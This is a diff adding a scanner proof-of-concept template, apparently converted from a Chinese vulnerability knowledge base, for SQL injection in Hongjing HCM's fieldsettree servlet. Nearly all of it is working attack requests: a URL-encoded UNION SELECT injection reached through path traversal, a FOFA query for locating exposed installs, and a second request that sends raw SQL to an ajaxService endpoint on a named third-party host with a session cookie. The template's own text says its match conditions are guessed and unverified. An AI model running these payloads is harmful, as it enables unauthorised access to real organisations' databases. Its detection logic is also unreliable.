@@ -1,0 +1,46 @@
+id: poc-ss7ka75cvtbd92un
+info:
+  name: 宏景HCM-fieldsettree-SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ss7ka75cvtbd92un
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ss7ka75cvtbd92un
+    fofa: app="HJSOFT-HCM"
+http:
+- raw:
+  - 'GET /templates/attestation/../../servlet/fieldsettree?flag=2&infor=1%27%20UNION%20ALL%20SELECT%2018%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%28SYSDATETIME%28%29%3DSYSDATETIME%28%29%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2C18--%20ltAi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+
+
+    构造注入'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /ajax/ajaxService HTTP/1.1
+
+    Host:crm1.dnt.com.cn
+
+    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/5317.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/5317.36
+
+    Cookie: JSESSIONID=8A569640D4EE7D518A536CC263DCBBB3
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    __type=extTrans&__xml={"functionId":"151211001137","sql":"select~20(select~20user)~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
